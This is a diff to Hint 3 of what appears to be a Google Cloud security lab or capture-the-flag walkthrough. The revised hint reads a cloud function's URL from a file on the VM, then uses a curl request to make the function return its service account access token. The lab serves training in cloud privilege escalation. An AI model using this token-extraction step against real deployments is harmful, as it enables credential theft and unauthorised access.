@@ -74,9 +74,15 @@ That last access scope looks promising. The access scope `devstorage.read_only` 
 <details>
   <summary>Hint 3</summary>
     
-  The script on the compute VM invokes the function. You can modify that request and ask the function to return its access token instead of its service account email:
+  The script on the compute VM invokes the function. You can modify that request and ask the function to return its access token instead of its service account email. 
+  
+  The function URL is stored in /home/alice/.function_url on the VM. You can also invoke the function directly:
   #####
-      curl -s -X POST https://europe-west1-$PROJECT_ID.cloudfunctions.net/monitoring-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'
+      # Read the function URL from the file
+      FUNCTION_URL=$(cat /home/alice/.function_url)
+      
+      # Invoke the function to get its token
+      curl -s -X POST "$FUNCTION_URL" -H "Authorization: Bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'
 
 </details>
 
